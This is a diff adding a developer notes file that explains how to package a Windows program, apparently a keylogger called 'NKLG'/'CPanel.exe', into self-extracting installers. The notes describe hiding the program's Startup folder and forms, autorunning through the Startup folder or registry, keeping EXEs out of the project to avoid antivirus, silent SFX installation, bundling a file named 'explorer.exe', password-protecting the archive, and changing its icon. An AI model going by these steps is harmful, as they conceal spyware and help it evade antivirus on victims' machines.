@@ -1,0 +1,40 @@
+Note for Programmer:
+1. EXE's have been removed from Project files to prevent it from antivirus.
+2. Autorun on startup are exact location based settings. Stored nowhere. Program checks existance of shortcut in Startup Folder OR registry.
+x3. Program automatically hides Startup folder.
+4. Forms hidden with "Transparent form" API functions. not me.hide
+
+#winRAR How to Build Package( Stand Alone Installation EXE )
+1. Install winRAR
+2. Select "Files" folder and "CPanel.exe" both. Right Click > Add to Archive.
+3. Check "Create SFX Archive." Uncheck All other.
+4. Advanced tab > SFX Options.. button
+	i) > Text and icon tab.
+	ii) At bottom choose icon for Stand Alone EXE. > OK
+5. in Comment tab put comments as below.
+
+;The comment below contains SFX script commands
+Setup=CPanel.exe
+TempMode
+Silent=1
+Overwrite=2
+Update=U
+; Comment Over
+
+
+#7 zip Build Package
+1. Get 7zsd.sfx
+2. Create "config.txt" in UTF-8 Encoding.
+----Help in Package\config Help.txt
+3. Have following files in same directory
+	1. explorer.exe
+	2. CPanel.exe
+	3. settings.txt
+	4. titles.txt
+	5. 7zsd.zfx
+	6. config.txt
+4. Right click on 1 to 4 selection 7-zip > Add to Archive > Give password
+5. Open cmd here and type
+	copy /b NKLG.7z+config.txt+7zsd.sfx nklg.exe
+6. Open nklg.exe in Resource Hacker.
+7. Change the icon.
